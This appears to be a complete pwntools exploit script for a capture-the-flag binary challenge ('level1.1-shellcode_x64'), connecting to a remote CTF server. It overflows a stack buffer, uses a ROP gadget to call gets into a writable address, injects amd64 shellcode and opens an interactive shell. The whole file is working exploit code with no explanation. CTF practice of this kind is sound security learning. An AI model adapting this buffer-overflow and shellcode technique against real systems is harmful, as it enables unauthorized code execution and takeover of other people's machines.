from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",23001)
#r=process("./level1.1-shellcode_x64")

elf=ELF("./level1.1-shellcode_x64")

prdi=0x0000000000400613
shellcode = asm(shellcraft.amd64.sh(),arch='amd64')

r.sendline('a'*0x28+p64(prdi)+p64(0x601800)+p64(elf.plt['gets'])+p64(0x601800))
r.sendline(shellcode)

r.interactive()
